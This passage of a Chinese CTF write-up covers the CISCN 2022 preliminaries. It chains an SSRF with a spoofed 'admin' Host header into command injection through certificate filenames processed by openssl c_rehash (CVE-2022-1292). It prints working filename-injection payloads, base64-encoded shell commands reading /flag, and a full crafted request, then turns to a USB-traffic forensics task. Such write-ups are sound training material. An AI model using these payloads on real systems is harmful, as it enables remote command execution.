+    subject <span class="token operator">=</span> issuer <span class="token operator">=</span> x509<span class="token punctuation">.</span>Name<span class="token punctuation">(</span><span class="token punctuation">[</span>
+        x509<span class="token punctuation">.</span>NameAttribute<span class="token punctuation">(</span>NameOID<span class="token punctuation">.</span>COUNTRY_NAME<span class="token punctuation">,</span> Country<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        x509<span class="token punctuation">.</span>NameAttribute<span class="token punctuation">(</span>NameOID<span class="token punctuation">.</span>STATE_OR_PROVINCE_NAME<span class="token punctuation">,</span> Province<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        x509<span class="token punctuation">.</span>NameAttribute<span class="token punctuation">(</span>NameOID<span class="token punctuation">.</span>LOCALITY_NAME<span class="token punctuation">,</span> City<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        x509<span class="token punctuation">.</span>NameAttribute<span class="token punctuation">(</span>NameOID<span class="token punctuation">.</span>ORGANIZATION_NAME<span class="token punctuation">,</span> OrganizationalName<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        x509<span class="token punctuation">.</span>NameAttribute<span class="token punctuation">(</span>NameOID<span class="token punctuation">.</span>COMMON_NAME<span class="token punctuation">,</span> CommonName<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        x509<span class="token punctuation">.</span>NameAttribute<span class="token punctuation">(</span>NameOID<span class="token punctuation">.</span>EMAIL_ADDRESS<span class="token punctuation">,</span> EmailAddress<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">)</span>
+    root_cert <span class="token operator">=</span> x509<span class="token punctuation">.</span>CertificateBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>subject_name<span class="token punctuation">(</span>
+        subject
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>issuer_name<span class="token punctuation">(</span>
+        issuer
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>public_key<span class="token punctuation">(</span>
+        root_key<span class="token punctuation">.</span>public_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>serial_number<span class="token punctuation">(</span>
+        x509<span class="token punctuation">.</span>random_serial_number<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>not_valid_before<span class="token punctuation">(</span>
+        datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>not_valid_after<span class="token punctuation">(</span>
+        datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">3650</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>root_key<span class="token punctuation">,</span> hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    crt_name <span class="token operator">=</span> <span class="token string">"static/crt/"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".crt"</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>crt_name<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>root_cert<span class="token punctuation">.</span>public_bytes<span class="token punctuation">(</span>serialization<span class="token punctuation">.</span>Encoding<span class="token punctuation">.</span>PEM<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> crt_name
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getcrt'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    Country <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Country"</span><span class="token punctuation">,</span> <span class="token string">"CN"</span><span class="token punctuation">)</span>
+    Province <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Province"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
+    City <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"City"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
+    OrganizationalName <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"OrganizationalName"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
+    CommonName <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"CommonName"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
+    EmailAddress <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"EmailAddress"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> get_crt<span class="token punctuation">(</span>Country<span class="token punctuation">,</span> Province<span class="token punctuation">,</span> City<span class="token punctuation">,</span> OrganizationalName<span class="token punctuation">,</span> CommonName<span class="token punctuation">,</span> EmailAddress<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/createlink'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    json_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"info"</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"c_rehash static/crt/ &amp;&amp; ls static/crt/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>json_data<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/proxy'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">proxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    uri <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"uri"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span>
+    client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">8887</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    msg <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''GET </span><span class="token interpolation"><span class="token punctuation">{</span>uri<span class="token punctuation">}</span></span><span class="token string"> HTTP/1.1
+Host: test_api_host
+User-Agent: Guest
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+'''</span></span>
+    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>
+    client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>/getcrt</code> 生成一个证书</p>
+<p><code>/createlink</code> 路由 会调用 c_rehash 创建证书链接</p>
+<p>搜了一下发现 openssl c_rehash 前不久就有个 CVE <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1292">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1292</a></p>
+<p>根据修复的 <a target="_blank" rel="noopener" href="https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=e5fd1728ef4c7a5bf7c7a7163ca60370460a6e23;hp=982fad3ec4107684a6cb442f593193972b06c41a">diff</a> 提示了在文件名处可以实现 rce </p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602171845443.png"></p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602171101150.png"></p>
+<p>而 <code>/proxy</code> 路由可以构造 SSRF，调用 golang 后端。虽然用的是 GET 方法，但是和 POST 其实一样，都能处理 body 部分的 form 数据。</p>
+<p>再看 golang 后端</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"github.com/gin-gonic/gin"</span>
+	<span class="token string">"os"</span>
+	<span class="token string">"strings"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">func</span> <span class="token function">admin</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	staticPath <span class="token operator">:=</span> <span class="token string">"/app/static/crt/"</span>
+	oldname <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"oldname"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+	newname <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"newname"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+	<span class="token keyword">if</span> oldname <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> newname <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>oldname<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>newname<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">}</span>
+	<span class="token keyword">if</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>RawPath <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Host <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token punctuation">{</span>
+		err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Rename</span><span class="token punctuation">(</span>staticPath<span class="token operator">+</span>oldname<span class="token punctuation">,</span> staticPath<span class="token operator">+</span>newname<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+			<span class="token keyword">return</span>
+		<span class="token punctuation">}</span>
+		c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> newname<span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">}</span>
+	c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"no"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">func</span> <span class="token function">index</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"hello world"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	router <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	router<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span>
+	router<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/admin/rename"</span><span class="token punctuation">,</span> admin<span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> err <span class="token operator">:=</span> router<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8887"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
+		<span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>/admin/rename</code> 可以改名，于是想到把要执行的命令放到文件名，在 c_rehash 执行的时候就会执行了</p>
+<p>不过有条件，需要 <code>c.Request.URL.RawPath != "" &amp;&amp; c.Request.Host == "admin"</code></p>
+<p>后者的话直接在 <code>/proxy</code> 路由构造 SSRF Host 字段就可以了</p>
+<p>前者的话，**<code>RawPath</code>只有在原始<code>path</code>中包含了转义字符时才会有值。**</p>
+<p><a target="_blank" rel="noopener" href="https://www.ipeapea.cn/post/go-url/">认识GO语言url.URL结构体</a></p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602175356512.png"></p>
+<p>于是整个流程理了一遍，可以开始做题了。</p>
+<p>首先 <code>/getcrt</code> 新建一个证书，拿到文件名</p>
+<p>然后构造文件名，根据 c_rehash 的源码，需要文件名以 <code>.(pem)|(crt)|(cer)|(crl)</code> 结尾</p>
+<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token function"><span class="token keyword">sub</span> hash_dir</span> <span class="token punctuation">{</span>
+	<span class="token keyword">my</span> <span class="token variable">%hashlist</span><span class="token punctuation">;</span>
+	<span class="token keyword">print</span> <span class="token string">"Doing $_[0]\n"</span><span class="token punctuation">;</span>
+	chdir <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	opendir<span class="token punctuation">(</span>DIR<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">my</span> <span class="token variable">@flist</span> <span class="token operator">=</span> sort readdir<span class="token punctuation">(</span>DIR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	closedir DIR<span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$removelinks</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token comment"># Delete any existing symbolic links</span>
+		<span class="token keyword">foreach</span> <span class="token punctuation">(</span>grep <span class="token punctuation">{</span><span class="token regex">/^[\da-f]+\.r{0,1}\d+$/</span><span class="token punctuation">}</span> <span class="token variable">@flist</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-l</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+				<span class="token keyword">print</span> <span class="token string">"unlink $_"</span> <span class="token keyword">if</span> <span class="token variable">$verbose</span><span class="token punctuation">;</span>
+				unlink <span class="token variable">$_</span> <span class="token operator">||</span> warn <span class="token string">"Can't unlink $_, $!\n"</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+	FILE<span class="token punctuation">:</span> <span class="token keyword">foreach</span> <span class="token variable">$fname</span> <span class="token punctuation">(</span>grep <span class="token punctuation">{</span><span class="token regex">/\.(pem)|(crt)|(cer)|(crl)$/</span><span class="token punctuation">}</span> <span class="token variable">@flist</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token comment"># Check to see if certificates and/or CRLs present.</span>
+		<span class="token keyword">my</span> <span class="token punctuation">(</span><span class="token variable">$cert</span><span class="token punctuation">,</span> <span class="token variable">$crl</span><span class="token punctuation">)</span> <span class="token operator">=</span> check_file<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$cert</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token variable">$crl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+			<span class="token keyword">print</span> STDERR <span class="token string">"WARNING: $fname does not contain a certificate or CRL: skipping\n"</span><span class="token punctuation">;</span>
+			<span class="token keyword">next</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		link_hash_cert<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		link_hash_cert_old<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		link_hash_crl<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$crl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		link_hash_crl_old<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$crl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>不过试了半天 payload 最后发现好像不出网……</p>
+<p>最后么得办法，构造 <code>touch $(cat /flag)</code>，base64 编码一下，把 flag 写到文件名上</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token string">"dG91Y2ggJChjYXQgL2ZsYWcp"</span><span class="token operator">|</span>base64<span class="token variable">${<span class="token environment constant">IFS</span>}</span>-d<span class="token operator">|</span><span class="token function">sh</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span>-i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>再配合合适的文件名，加上引号闭合掉</p>
+<pre class="line-numbers language-none"><code class="language-none">1.crt"||echo${IFS}"dG91Y2ggJChwcyAtZWZ8YmFzZTY0KQ=="|base64${IFS}-d|sh${IFS}-i"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后构造 SSRF，闭合掉 <code>/proxy</code> 请求，设置 host 为 admin。</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">GET</span> /proxy HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> xxxx.cloudeci1.ichunqiu.com:8888
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Connection:</span> close
+<span class="token header-name keyword">Cookie:</span> __jsluid_h=c526484542a6d2cfc5d4b1dbd1722c09
+<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1
+<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=----WebKitFormBoundaryIZBj4kiaMbZzC9WL
+<span class="token header-name keyword">Pragma:</span> no-cache
+<span class="token header-name keyword">Cache-Control:</span> no-cache
+<span class="token header-name keyword">Content-Length:</span> 317
+
+------WebKitFormBoundaryIZBj4kiaMbZzC9WL
+<span class="token header-name keyword">Content-Disposition:</span> form-data; name="uri"
+
+/admin%2frename?oldname=f5f729cb-d402-4665-b12c-a55fcc970d9a.crt&amp;newname=1.crt"||echo${IFS}"dG91Y2ggJChwcyAtZWZ8YmFzZTY0KQ=="|base64${IFS}-d|sh${IFS}-i" HTTP/1.1
+<span class="token header-name keyword">Host:</span> admin
+
+GET /
+------WebKitFormBoundaryIZBj4kiaMbZzC9WL--
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602183137213.png"></p>
+<p>或者也可以用 <code>application/x-www-form-urlencoded</code>，但是 path 中的转义需要二次 url 编码，否则会返回 400</p>
+<p>然后再访问 <code>/createlink</code> 就可以得到回显的 flag</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220602183410654.png"></p>
+<p>（别问，问就是试了几个小时怎么构造 payload 读 flag 再回显回来。。</p>
+<p>赛后问了下其他师傅，说直接 <code>cat /flag &gt; 1</code>，然后直接下载 <code>/static/crt/1</code> 就完事了。</p>
+<p>草，static 目录下是能直接读的，我是废物了，浪费了一堆时间，呜呜</p>
+<p>另外，其实还可以构造个带反引号的文件名，从而触发执行。但是由于 Linux 下的文件名不能包含目录分隔符 <code>/</code>（当然带有 <code>\</code> 就可以） ，于是得找个变量来代替。</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/">白帽酱的 writeup</a>，发现环境变量中 <code>OLDPWD</code> 的值刚好为我们所需要的 <code>/</code></p>
+<pre class="line-numbers language-none"><code class="language-none">uri=/admin%2frename?oldname=d205092e-c641-423e-82f0-e96f583f3c38.crt&amp;newname=0`cat ${OLDPWD}flag &gt;miaotony`.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>记得 urlencode 就行</p>
+<p><em>（其实最开始喵喵就试过反引号执行了，但是不知道为啥不行，最后才知道是带有 <code>/</code> 的锅</em></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><blockquote>
+<p>简单的流量。</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/11I-zGVs4LhJsHeS18NK_ow">附件下载</a> 提取码（GAME）<a target="_blank" rel="noopener" href="https://share.weiyun.com/1IzbrIBh">备用下载</a></p>
+</blockquote>
+<p>USB 数据抓包，2.8.1 和 2.10.1 两个设备都是键盘</p>
+<p>筛选一下 usb.src == “2.10.1” || usb.dst == “2.10.1” 这样，导出特定分组</p>
+<p>用 <a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a> 解码一下</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603023003856.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">[+] Found : 35c535765e50074a
+[+] Found :     526172211a0700&lt;CAP&gt;c&lt;CAP&gt;f907300000d00000000000000c4527424943500300000002&lt;CAP&gt;a000000&lt;CAP&gt;02b9f9b0530778b5541d33080020000000666c61672&lt;CAP&gt;e&lt;CAP&gt;747874&lt;CAP&gt;b9b&lt;CAP&gt;a013242f3a&lt;CAP&gt;fc&lt;CAP&gt;000b092c229d6e994167c05&lt;CAP&gt;a7&lt;CAP&gt;8708b271f&lt;CAP&gt;fc&lt;CAP&gt;042ae3d251e65536&lt;CAP&gt;f9a&lt;CAP&gt;da87c77406b67d0&lt;CAP&gt;e6316684766&lt;CAP&gt;a86e844d&lt;CAP&gt;c81aa2&lt;CAP&gt;c72c71348d10c4&lt;CAP&gt;c&lt;DEL&gt;3d7b&lt;CAP&gt;00400700<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>去掉 CAP 和 DEL 之前的一个字符</p>
+<pre class="line-numbers language-none"><code class="language-none">526172211a0700cf907300000d00000000000000c4527424943500300000002a00000002b9f9b0530778b5541d33080020000000666c61672e747874b9ba013242f3afc000b092c229d6e994167c05a78708b271ffc042ae3d251e65536f9ada87c77406b67d0e6316684766a86e844dc81aa2c72c71348d10c43d7b00400700<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603023631775.png"></p>
+<p>发现其中 2.8.1 出来是个 rar 压缩包，里面有个 <code>flag.txt</code>，但是加密了</p>
+<p>在 2.10.1 这个解密得到密码为 <code>35c535765e50074a</code></p>
+<p>拿去解压得到 flag</p>
+<p><code>flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}</code></p>
+<h3 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h3><blockquote>
+<pre><code>永恒的夜，又隐藏着什么真相？
+
+[附件下载](https://pan.baidu.com/s/1flAr5j9K2-QUQCyPImLVuw) 提取码（GAME）[备用下载](https://share.weiyun.com/jt5O3sBf)
+
+仔细观察png数据块，通道隐藏的数据可以配合lsb隐写
+</code></pre>
+</blockquote>
+<p>（复现一下</p>
+<p>开局一张图</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/everlasting_night.png" alt="everlasting_night"></p>
+<p>文件 hex 最后一串奇怪的东西</p>
